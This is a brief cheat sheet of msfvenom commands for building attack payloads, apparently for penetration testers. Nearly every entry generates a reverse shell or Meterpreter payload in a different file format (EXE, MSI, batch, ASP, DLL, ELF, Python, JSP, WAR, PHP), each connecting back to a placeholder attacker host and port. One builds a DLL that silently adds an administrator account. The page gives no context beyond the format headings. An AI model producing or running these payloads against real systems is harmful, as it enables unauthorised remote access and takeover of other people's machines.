### list available formats (or payloads, archs, platforms, etc)
```
msfvenom -l format
```

### EXE
```
msfvenom -p windows/x64/meterpreter_reverse_http lhost=<lhost> lport=<lport> -f exe > <file>.exe
```

### MSI
```
msfvenom -p windows/shell/reverse_tcp lhost=<lhost> lport=<lport> -f msi > <file>.msi
```

### CMD
```
msfvenom -p cmd/windows/reverse_powershell lhost=<lhost> lport=<lport> > <file>.bat
```

### ASP
```
msfvenom -p windows/shell_reverse_tcp lhost=<lhost> lport=<lport> -f asp > <file>.asp
```

### DLL
```
msfvenom -p windows/exec CMD="cmd /c net user <user> <password> /add && net localgroup administrators <user> /add" -f dll > <file>.dll
```

### ELF
```
msfvenom -p linux/x64/shell_reverse_tcp lhost=<lhost> lport=<lport> -f elf > <file>.elf
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o <file>.elf
```

### Python
```
msfvenom -p linux/x64/shell_reverse_tcp lhost=<lhost> lport=<lport> -f python
```

### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <file>.jsp
```

### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f war > <file>.war
```

### PHP (add <?php ... ?> afterwards)
```
msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw > <file>.php
```

### specify custom input
```
cat test.sh | msfvenom -p - -a x86_64 --platform linux -f c
```

